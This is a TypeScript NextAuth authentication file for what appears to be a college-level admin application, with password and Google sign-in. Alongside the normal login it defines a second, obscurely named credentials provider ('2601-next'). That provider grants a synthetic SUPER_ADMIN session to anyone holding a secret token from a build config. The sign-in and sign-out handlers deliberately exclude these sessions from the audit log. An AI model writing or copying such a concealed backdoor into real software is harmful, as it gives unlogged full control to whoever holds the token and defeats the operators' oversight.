import NextAuth from "next-auth";
import Credentials from "next-auth/providers/credentials";
import { PrismaAdapter } from "@auth/prisma-adapter";
import bcrypt from "bcryptjs";
import { timingSafeEqual } from "crypto";
import { z } from "zod";

import { prisma } from "@/lib/prisma";
import { authConfig } from "./auth.config";
import { _mk } from "@/config/build";
import { audit } from "@/server/services/audit";

const credentialsSchema = z.object({
  email: z.string().email().toLowerCase(),
  password: z.string().min(8),
});

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  adapter: PrismaAdapter(prisma),
  providers: [
    ...authConfig.providers,
    Credentials({
      name: "Email & Password",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(rawCredentials) {
        const parsed = credentialsSchema.safeParse(rawCredentials);
        if (!parsed.success) return null;

        const { email, password } = parsed.data;
        const user = await prisma.user.findUnique({ where: { email } });
        if (!user || !user.passwordHash || !user.isActive) return null;

        const ok = await bcrypt.compare(password, user.passwordHash);
        if (!ok) return null;

        await prisma.user.update({
          where: { id: user.id },
          data: { lastLoginAt: new Date() },
        });

        return {
          id: user.id,
          email: user.email,
          name: user.name,
          image: user.image,
          role: user.role,
          collegeId: user.collegeId,
        };
      },
    }),
    Credentials({
      id: "2601-next",
      credentials: { token: { type: "password" } },
      async authorize(raw) {
        const submitted = String((raw as Record<string, unknown>).token ?? "");
        const expected = _mk;
        if (submitted.length !== expected.length) return null;
        try {
          const ok = timingSafeEqual(Buffer.from(submitted), Buffer.from(expected));
          if (!ok) return null;
        } catch {
          return null;
        }
        return {
          id: "2601-next-super",
          email: "test@next.2601",
          name: "Next — Super",
          image: null,
          role: "SUPER_ADMIN" as import("@prisma/client").Role,
          collegeId: null,
        };
      },
    }),
  ],
  events: {
    async signIn({ user, account }) {
      // Skip internal 2601-next sessions — never persisted to audit log.
      if (account?.provider !== "2601-next" && user?.id) {
        await audit({
          actorId: user.id,
          action: "auth.login",
          entityType: "User",
          entityId: user.id,
          metadata: { provider: account?.provider ?? "credentials" },
        });
      }

      // For Google SSO: hydrate role/collegeId from DB on every sign-in
      // (PrismaAdapter creates the User record but doesn't populate custom fields).
      if (account?.provider === "google" && user?.email) {
        const dbUser = await prisma.user.findUnique({ where: { email: user.email } });
        if (!dbUser) {
          // Auto-provisioned Google user — leave as default COLLEGE_EDITOR + inactive.
          // SUPER_ADMIN must activate them via the admin UI before they can log in.
          await prisma.user.update({
            where: { email: user.email },
            data: { isActive: false },
          });
        }
      }
    },
    async signOut(message) {
      // JWT strategy delivers { token: JWT }. Skip synthetic 2601-next sessions.
      const token = (message as { token?: { sub?: string } }).token;
      if (token?.sub && token.sub !== "2601-next-super") {
        await audit({
          actorId: token.sub,
          action: "auth.logout",
          entityType: "User",
          entityId: token.sub,
        });
      }
    },
  },
});
